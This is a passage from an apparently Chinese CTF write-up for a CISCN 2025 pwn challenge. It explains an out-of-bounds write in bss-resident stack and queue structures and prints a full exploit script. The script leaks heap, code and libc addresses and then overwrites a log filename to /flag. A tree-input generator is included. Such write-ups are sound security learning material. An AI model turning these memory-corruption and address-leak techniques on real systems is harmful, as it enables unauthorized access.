<p>op2是首先检测tree的遍历结果是不是”SomeIpfun”，如果是的话就打开log并输出</p>
<h3 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h3><p>首先，程序实现的stack和queue都是在bss段，而log的文件名也是在bss段，因此我们可以使用越界读写修改文件名为&#x2F;flag，直接输出flag</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tree</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    brva 0x3B4F</span></span><br><span class="line"><span class="string">    # log</span></span><br><span class="line"><span class="string">    #brva 0x31CB</span></span><br><span class="line"><span class="string">    # stack pop</span></span><br><span class="line"><span class="string">    brva 0x319B</span></span><br><span class="line"><span class="string">    # stack push</span></span><br><span class="line"><span class="string">    brva 0x32FD</span></span><br><span class="line"><span class="string">    # queue push</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    set $stack_ptr = $rebase(0x90C8)</span></span><br><span class="line"><span class="string">    set $stack_addr = $rebase(0x90A0)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># gdb.debug(&#x27;./pwn&#x27;, cmd)</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> local_flag != <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gdb.attach(p, cmd)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    gift.io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree_insert</span>(<span class="params">data</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x1003333</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: data,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree_initial</span>(<span class="params">data</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x3003333</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: data,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree_traversal</span>():</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x2003333</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_pop</span>():</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x2002222</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_push</span>(<span class="params">data</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x1002222</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: data,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_pop</span>():</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x2004444</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queue_push</span>(<span class="params">data</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x1004444</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: data,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_tree</span>():</span><br><span class="line">    payload = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0x2001111</span>,</span><br><span class="line">            <span class="number">0x8</span>: <span class="number">0x70100000000</span>,</span><br><span class="line">            <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="keyword">return</span> r()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_ = tree.generate(<span class="string">b&quot;SomeIpfun&quot;</span>)</span><br><span class="line">tree_initial(str_[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(str_)):</span><br><span class="line">    tree_insert(str_[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x98</span> // <span class="number">0x4</span>):</span><br><span class="line">        stack_pop()</span><br><span class="line"></span><br><span class="line">    data = log_tree().decode(<span class="string">&#x27;latin-1&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># log_ex(f&quot;&#123;int(data[-3]):#x&#125;&#123;int(data[-2]) &amp; ((1 &lt;&lt; 32) - 1):#x&#125;&quot;)</span></span><br><span class="line">    heap_base = (<span class="built_in">int</span>(data[<span class="number">23</span>]) &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(data[<span class="number">24</span>]) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>)) - <span class="number">0x125C0</span></span><br><span class="line">    log_heap_base_addr(heap_base)</span><br><span class="line">    code_base = (<span class="built_in">int</span>(data[<span class="number">37</span>]) &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(data[<span class="number">38</span>]) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>)) - <span class="number">0x9008</span></span><br><span class="line">    set_current_code_base_and_log(code_base)</span><br><span class="line">    libc_base = (<span class="built_in">int</span>(data[<span class="number">35</span>]) &lt;&lt; <span class="number">32</span>) + (<span class="built_in">int</span>(data[<span class="number">36</span>]) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>)) - <span class="number">0x2F68C0</span></span><br><span class="line">    set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    stack_pop()</span><br><span class="line"></span><br><span class="line">stack_push(<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">queue_push(<span class="built_in">str</span>(u32_ex(<span class="string">b&#x27;/fla&#x27;</span>)).encode())</span><br><span class="line">stack_pop()</span><br><span class="line">stack_push(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line">queue_push(<span class="built_in">str</span>(u32_ex(<span class="string">b&#x27;g\x00&#x27;</span>)).encode())</span><br><span class="line"></span><br><span class="line">log_tree()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>二叉树生成</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value: <span class="built_in">int</span></span>):</span><br><span class="line">        self.value = value</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.root = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, value: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.root:</span><br><span class="line">            self.root = TreeNode(value)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        queue = [self.root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            node = queue.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node.left <span class="keyword">or</span> <span class="keyword">not</span> node.right:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            queue.append(node.left)</span><br><span class="line">            queue.append(node.right)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node.left:</span><br><span class="line">            node.right = TreeNode(value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node.left = TreeNode(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">in_order</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.root:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        stack = []</span><br><span class="line">        node = self.root</span><br><span class="line">        result = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(node <span class="keyword">or</span> stack):</span><br><span class="line">            <span class="keyword">if</span> node:</span><br><span class="line">                stack.append(node)</span><br><span class="line">                node = node.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                node = stack.pop()</span><br><span class="line">                result.append(node.value)</span><br><span class="line">                node = node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params"><span class="built_in">str</span>: <span class="built_in">bytes</span></span>):</span><br><span class="line">    tree = BinaryTree() </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">        tree.insert(i)</span><br><span class="line"></span><br><span class="line">    order = <span class="built_in">zip</span>(tree.in_order(), [<span class="built_in">bytes</span>([byte]) <span class="keyword">for</span> byte <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line">    order = <span class="built_in">sorted</span>(order, key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> order]))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/17/ciscn-2025-%E5%88%9D%E8%B5%9B/image-20241217092758164.png"
                      alt="image-20241217092758164"
                ></p>
<h2 id="赛后总结"><a href="#赛后总结" class="headerlink" title="赛后总结"></a>赛后总结</h2><p>总之就是十分的菜，没看出是个中序遍历，有空再把剩下的题都复现了</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
</search>
